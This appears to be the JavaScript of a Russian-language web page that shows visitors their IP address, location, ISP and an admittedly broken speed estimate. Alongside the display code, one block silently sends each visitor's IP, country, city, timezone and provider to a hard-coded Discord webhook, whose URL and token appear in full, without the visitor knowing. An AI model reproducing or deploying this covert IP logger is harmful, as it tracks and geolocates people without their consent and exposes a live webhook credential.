
    // Функция для замены "undefined" на "Не найдено"
    function checkUndefined(value) {
      if (value === undefined) {
        return "Не найдено";
      } else {
        return value;
      }
    }

    // Получение информации о скорости интернета не рабочая кста
    let startTime, endTime;
    let downloadSize = 5616998; // Размер файла для тестирования скорости в байтах из интернета спиздил
    let download = new Image();
    download.onload = function () {
      endTime = (new Date()).getTime();
      let duration = (endTime - startTime) / 1000;
      let bitsLoaded = downloadSize * 8;
      let speedBps = (bitsLoaded / duration).toFixed(2);
      let speedKbps = (speedBps / 1024).toFixed(2);
      let speedMbps = (speedKbps / 1024).toFixed(2);
      document.getElementById('results').innerHTML += `<p>Скорость загрузки: ${checkUndefined(speedMbps)} Mbps</p>`;
    }
    startTime = (new Date()).getTime();
    let cacheBuster = "?nnn=" + startTime;
    download.src = "https://www.google.com/images/phd/px.gif" + cacheBuster;

    // Получение информации об IP-адресе, местоположении и провайдере
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        document.getElementById('results').innerHTML += `<p>IP-адрес: ${checkUndefined(data.ip)}</p>`;
        document.getElementById('results').innerHTML += `<p>Страна: ${checkUndefined(data.country_name)}</p>`;
        document.getElementById('results').innerHTML += `<p>Город: ${checkUndefined(data.city)}</p>`;
        document.getElementById('results').innerHTML += `<p>Часовой пояс: ${checkUndefined(data.timezone)}</p>`;
        document.getElementById('results').innerHTML += `<p>Провайдер: ${checkUndefined(data.org)}</p>`;


      });
        fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
  let discordWebhookUrl = 'https://discord.com/api/webhooks/1112425555200053389/P7vg6psaDL6d3ruOy_HD5kYnldsgYzg49245pQTQYqlgjUKOaFDiQVwLS1zOa2CwE5yo';
                        let embedData = {
                            embeds: [
                                {
                                    title: 'Информация об интернете пользователя',
                                    fields: [
                                        {
                                            name: 'IP-адрес',
                                            value: checkUndefined(data.ip),
                                            inline: true
                                        },
                                        {
                                            name: 'Страна',
                                            value: checkUndefined(data.country_name),
                                            inline: true
                                        },
                                        {
                                            name: 'Город',
                                            value: checkUndefined(data.city),
                                            inline: true
                                        },
                                        {
                                            name: 'Часовой пояс',
                                            value: checkUndefined(data.timezone),
                                            inline: true
                                        },
                                        {
                                            name: 'Провайдер',
                                            value: checkUndefined(data.org),
                                            inline: true
                                        }
                                    ]
                                }
                            ]
                        };
                        fetch(discordWebhookUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
body: JSON.stringify(embedData)
                        });
              });


    // 
    fetch('https://ipwhois.app/json/')
      .then(response => response.json())
      .then(data => {
        document.getElementById('results').innerHTML += `<p>Тип IP-адреса: ${checkUndefined(data.type)}</p>`;
        document.getElementById('results').innerHTML += `<p>ASN: ${checkUndefined(data.asn)}</p>`;
        document.getElementById('results').innerHTML += `<p>Доменное имя: ${checkUndefined(data.isp)}</p>`;
        document.getElementById('results').innerHTML += `<p>Валюта: ${checkUndefined(data.currency)}</p>`;
        document.getElementById('results').innerHTML += `<p>Язык: ${checkUndefined(data.languages)}</p>`;
      });
function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
}
setInterval(() => {
  console.log('Divelzz / ' + makeid(5))
  }, 2123);